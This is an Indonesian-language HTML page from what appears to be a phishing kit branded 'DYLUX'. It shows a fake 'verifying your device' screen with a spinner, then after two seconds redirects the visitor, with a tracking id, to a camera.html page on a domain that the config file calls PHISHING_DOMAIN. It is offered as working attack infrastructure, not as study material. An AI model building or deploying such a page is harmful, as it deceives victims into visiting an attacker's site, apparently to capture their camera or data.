<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DYLUX</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: 'Inter', -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e0e0ff;
        }
        .container {
            text-align: center;
            padding: 40px;
            max-width: 500px;
        }
        .logo {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 16px;
        }
        .sub {
            font-size: 14px;
            color: #8888aa;
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-bottom: 24px;
        }
        .card {
            background: #14141e;
            border: 1px solid rgba(0,240,255,0.1);
            border-radius: 16px;
            padding: 32px;
            margin-bottom: 24px;
        }
        .card h2 {
            font-size: 20px;
            margin-bottom: 8px;
        }
        .card p {
            color: #8888aa;
            font-size: 14px;
            line-height: 1.6;
        }
        .loader {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 3px solid rgba(0,240,255,0.1);
            border-top-color: #00f0ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 16px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer {
            font-size: 12px;
            color: #555577;
            margin-top: 16px;
        }
        .footer a { color: #00f0ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">DYLUX</div>
        <div class="sub">Cahaya dalam Kegelapan</div>
        
        <div class="card">
            <div class="loader"></div>
            <h2>Sedang Memproses...</h2>
            <p>Harap tunggu, sistem sedang memverifikasi perangkat Anda.</p>
        </div>
        
        <div class="footer">
            &copy; 2026 <a href="#">DYLUX</a> • Powered by <a href="#">KazzahOffc</a>
        </div>
    </div>
    
    <script>
        // Auto redirect setelah 2 detik
        setTimeout(() => {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if (id) {
                window.location.href = `${DYLUX_CONFIG.PHISHING_DOMAIN}/camera.html?id=${id}`;
            }
        }, 2000);
    </script>
</body>
</html>
